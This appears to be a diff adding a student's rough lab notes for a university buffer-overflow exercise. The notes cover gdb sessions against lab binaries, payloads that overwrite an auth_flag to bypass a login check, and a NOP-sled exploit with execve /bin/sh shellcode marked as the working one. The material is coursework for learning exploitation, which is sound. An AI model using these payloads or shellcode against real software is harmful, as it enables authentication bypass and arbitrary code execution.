@@ -1,0 +1,206 @@
+bof :-
+ asciinema rec  team26.cast -t "Aamiruddin Syed William Stockton CY5010 Buffer Overflow Lab"
+ asciinema rec  team26_extra.cast -t "Aamiruddin Syed William Stockton CY5010 Buffer Overflow Lab"
+disable aslr
+docker pull sierraneu/buffer-overflow
+Pull the docker container for this lab using the command:
+part-2
+docker run --privileged --name buffer-overflow -it sierraneu/buffer-overflow
+docker run container id
+have to commit and close docker container
+docker start id
+docker attach buffer-overflow1
+
+part3:- need address for shell attack in shell code given
+ gcc -fno-stack-protector -z execstack -o extra extra.c
+
+Part-1
+TEAM_VAR_SIZE = ((team_member’s_NUID_last_4_digits + team_member’s_NUID_lnast_4_digits)  x 50) % 512
+(4756+x)*50%512
+test:-
+(4756+2469)*50%512=25600
+57
+disabled aslr and compile login.c
+./build.sh 
+
+part-2 //overflow
+b 22 //for auth_flag
+(gdb) p &auth_flag
+$1 = (int *) 0x7fffffffea5c
+
+@plt dynamic linkage
+run user pass
+address of check-auth:- 0x400686
+
+0x000000000040076d :-  addr of buffer end of auth
+0x0000000000400768
+./login username `python -c “print(‘password’)”`
+//need to omit this line
+ 0x000000000040073d <+41>:    callq  0x400540 <printf@plt>
+ main (argc=1, argv=0x7fffffffed38)
+
+   0x00000000004006ba <+52>:    callq  0x400510 <strcpy@plt>
+   0x00000000004006bf <+57>:    mov    -0x160(%rbp),%rdx
+
+break *addr  //need it els no registers
+run $(python -c "print('A'*246)")  
+
+0x7fffffffe990:: 0x42    0x42    0x42    0x42    0x42    0x42    0x42    0x42
+
+
+ run $(python -c "print('B'*334)") p
+
+Starting program: /home/user/login $(python -c "print('B'*334)") p
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000424242424242 in ?? ()
+0x0000000000400713
+ run $(python -c "print('username'*330)") $(python -c "print('password'*330)")// so 4242 address ned shellcode here but as per requirement cant
+
+ run $(python -c "print('B'*334)") p
+ run $(python -c "print('\x90'*327+)") p
+327=334-(6+1 null byte)
+
+ (gdb)  run $(python -c "print('B'*328+'\x80\xe9\xff\xff\xff\x7f')") p
+Starting program: /home/user/login $(python -c "print('B'*328+'\x80\xe9\xff\xff\xff\x7f')") p
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007fffffffe980 in ?? ()
+ info registers
+rax            0x42424242       1111638594
+rbx            0x0      0
+rcx            0x7ffff7ab2d40   140737348578624
+rdx            0x54     84
+rsi            0x400838 4196408
+rdi            0x7fffffffe8d0   140737488349392
+rbp            0x4242424242424242       0x4242424242424242
+rsp            0x7fffffffea20   0x7fffffffea20
+rip            0x7fffffffe980   0x7fffffffe980
+
+
+run $(python -c "print('B'*320+'\x80\xe9\xff\xff\xff\x7f'+'/bin/sh')") p
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000068732f in ?? ()
+328-38=290
+ auth_flag = 1; is the first push or find the address of it
+every runtime the address of auth_flag is changed 
+
+0x7fffffffea10: 0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0x7fffffffea18: 0x90    0x90    0x90    0x90    0x01    0x01    0x01    0x01
+0x7fffffffea20: 0x01    0x01    0x01    0x01    0x01    0x01    0x00    0x00
+0x7fffffffea28: 0x00    0x00    0x00    0x00    0x00    0x00
+(gdb) p &auth_flag
+$29 = (int *) 0x7fffffffeacc
+(gdb) p 0x7fffffffea2c -0x7fffffffea22
+$30 = 10
+(gdb) del
+Delete all breakpoints? (y or n) y
+(gdb)  run p $(python -c "print('\x90'*332+'\x01')")   //correct one just have postfix the authflag true after the overflow blocks *need to overflow the password position
+
+
+
+
+
+
+
+
+part-3 // only shellcode
+--------------------------------------------------------------------------------------------
+gdb ./program
+(gdb) disas main   //just go for call function
+break addr 
+ 0x00000000004006a8 <+98>:    callq  0x4004e0 <strcpy@plt>
+   0x00000000004006ad <+103>:   mov    -0x340(%rbp),%rax
+   0x00000000004006b4 <+110>:   add    $0x10,%rax
+
+ run p $(python -c "print('B'*256)") 
+x/200xb $esp  //littl endian  jott the address of starting of buffer
+rsp            0x7fffffffe800   0x7fffffffe800
+/size of buffer
+rsp for 64bit and esp for 32bit
+
+0x7fffffffee28::start of buffer 
+run p $(python -c "print('A'*830)") //find the memory addr 0x7fffffffebf8
+
+
+27 B long shellcode.txt
+830-27=803-7=796-6=791    //0x0000414141414141 in ?? ()
+so 832-27=805
+830-45=785
+c //overflow 0x0000414141414141 in ?? ()
+
+
+run user $(python -c "print('\x90'*800 +'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\x15\xee\xff\xff\xff\xf7\x00\x00')")   
+//Program received signal SIGSEGV, Segmentation fault.
+next_env_entry (position=<optimized out>) at arena.c:223 i.e malloc file if used , in place of +
+
+
+ 0x00000000004006a8 <+98>:    callq  0x4004e0 <strcpy@plt>
+   0x00000000004006ad <+103>:   mov    -0x340(%rbp),%rax
+  0x00000000004006bb <+117>:   lea    -0x330(%rbp),%rax
+0x7fffffffe7d0-rax: buffer =\x00\xe9\xff\xff\xff\xf7
+rsp            7fffffffee10 
+0x7fffffffef10:  buffer size=256
+p &argv[2]
+$1 = (char **) 0x7fffffffe9e8;ist
+
+
+(gdb) run user $(python -c "print('\x90'*754 +'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\x90'*46+'\x28\xee\xff\xff\xff\xf7\x00\x00')")
+
+Program received signal SIGSEGV, Segmentation fault.
+0xffffffee15909090 in ?? ()
+
+ run user $(python -c "print('\x90'*750 +'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\x90'*46+'\x28\xee\xff\xff\xff\xf7\x00\x00')")
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000f7ffffffee in ?? ()
+(gdb) info frame
+Stack level 0, frame at 0x7fffffffe918:
+ rip = 0xf7ffffffee; saved rip = 0x0
+ called by frame at 0x7fffffffe920
+ Arglist at 0x7fffffffe908, args:
+ Locals at 0x7fffffffe908, Previous frame's sp is 0x7fffffffe918
+ Saved registers:
+  rip at 0x7fffffffe910
+
+
+run user $(python -c "print('\x90'*753 +'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\x90'*46+'\x28\xee\xff\xff\xff\x7f\x00\x00')")
+
+0x7fffffffe908: 0x28    0xee    0xff    0xff    0xff    0xf7    0x00    0x00  i.e writting into argv[2] the ret address
+
+0x7fffffffef08: 0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x28
+0x7fffffffef10: 0xee    0xff    0xff    0xff    0xf7
+
+./extra user $(python -c "print('\x90'*750 +'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\x90'*47+'\x28\xee\xff\xff\xff\x7f\x00\x00')")
+
+750+46+27=823
+
+ run user $(python -c "print('\x90'*750 +'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\x90'*47+'\x28\xee\xff\xff\xff\x7f\x00\x00')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/extra user $(python -c "print('\x90'*750 +'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\x90'*47+'\x28\xee\xff\xff\xff\xf7\x00\x00')")
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000400719 in main (argc=3, argv=0x7fffffffe9e8) at extra.c:37
+37      }
+(gdb) info frame
+Stack level 0, frame at 0x7fffffffe910:
+ rip = 0x400719 in main (extra.c:37); saved rip = 0xf7ffffffee28
+ source language c.
+ Arglist at 0x9090909090909090, args: argc=3, argv=0x7fffffffe9e8
+ Locals at 0x9090909090909090, Previous frame's sp is 0x7fffffffe910
+ Saved registers:
+  rbp at 0x7fffffffe900, rip at 0x7fffffffe908
+
+
+
+run user $(python -c "print('\x90'*798 +'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\x28\xee\xff\xff\xff\x7f\x00')")
+---------------------------------------------------------------------------
+correct one
+ run user $(python -c "print('\x90'*750 +'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\x90'*47+'\x28\xee\xff\xff\xff\x7f\x00\x00')")// /bin/zsh5
+
+
+./extra user $(python -c "print('\x90'*750 +'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\x90'*47+'\x28\xee\xff\xff\xff\x7f\x00\x00')")
+
+
+
